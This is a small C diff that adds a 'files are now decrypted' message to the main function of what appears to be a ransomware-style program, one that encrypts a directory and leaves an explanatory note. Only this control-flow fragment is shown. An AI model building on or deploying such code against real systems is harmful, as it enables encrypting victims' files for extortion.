@@ -28,6 +28,10 @@ int main (int argc, char **argv){
 	}
 	encDir(argv[1], key);
 	free(key);
-	if(ENCRYPT == 1) leaveExplanation();
+	if(ENCRYPT == 1){
+		leaveExplanation();
+	} else {
+		printf("Your files are now decrypted !\n");
+	}
 	return 0;
 }
